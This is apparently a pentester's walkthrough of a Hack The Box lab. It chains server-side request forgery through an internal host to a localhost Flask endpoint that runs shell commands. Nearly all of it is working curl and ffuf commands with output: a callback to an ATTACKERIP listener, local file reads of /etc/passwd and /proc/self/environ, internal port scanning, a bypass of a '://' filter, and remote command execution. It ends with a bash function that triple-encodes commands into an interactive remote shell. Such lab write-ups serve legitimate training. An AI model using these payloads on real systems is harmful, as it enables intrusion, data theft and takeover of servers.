The application flow is the following in this example from HTB:
```
[PENTESTER] 	ðŸ – 	[EXERCISE-TARGET]--[SSRF] 	ðŸ – 	[INTERNAL-WEBSERVER]--[SSRF] 	ðŸ – 	[LOCALHOST WEBAPP] 	ðŸ – 	[RCE]
```
1)Identify the web-page logic (this will show what request is loaded)
```
curl -i -s http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT
```
2)Let's followup the redirect after load?q=   (this will show the **HOSTNAME=laguna** and the internal website=internal.app.local that we can't reach)
```
yovecio@htb[/htb]$ curl -i -s -L http://<TARGET IP>
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```
3)Let's check for SSRF (it will show a session in PHP server if we can get back a request)
```
php -S 0.0.0.0:80       (On our machine)
curl -i -s "http://VICTIMIP/load?q=http://ATTACKERIP:8080"
```
4)Retrieve the site structure (Several way to do same shit)
```
LFI: curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"

RFI via HTTP SCHEMA (load your html at the very end query): curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
```
PORT SCAN via FFUF:
```
for port in {1..65535};do echo $port >> ports.txt;done
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" 
```
5)Take it a step further towards internal.app.local (Here we find that even internal uses same **load?q** logic)
READ the **index.html**: 
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
.....
<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
```
6)Take it a step further toward 127.0.0.1 (RCE is the main goal)
PORT FUZZING (here we find that **://** is removed by back-end as protection): 
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```
BYPASS the blacklist **://** to confuse the back-end:
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http:////127.0.0.1:1"
```
7)Port-fuzzing via FFUF 
```
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
```
8)Undercover the back-end structure (**internal_local.py** is the file we might be interested into)
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>
```
9)Find the working dir in the backend (same fashion as a normal LFI. We can see it's **/app**)
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -

html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VE
```
10)Now we can LFI the file at **/app/internal_local.py** (**/runme** can execute RCE)
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>
```
11)RCE (command execution baby)
```
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

HTTP/1.0 200 OK
<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
```
**OBS**: if you need to send complex commands with spaces and difficult chars then you need to URL encode the payload the same number of times as the endpoint are using example here we are going from the external **ip -> internal.app -> 127.0.0.1** 
This means you need to URL encode <font color="#ff0000">**3 times**! </font>


# EXTRA 
(RCE Automation, you might have to adapt it to your needs)
CREATE A BASH SCRIPT:
```
function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```
**PROFIT** (just run the commands you want and it will parse via JS/URL)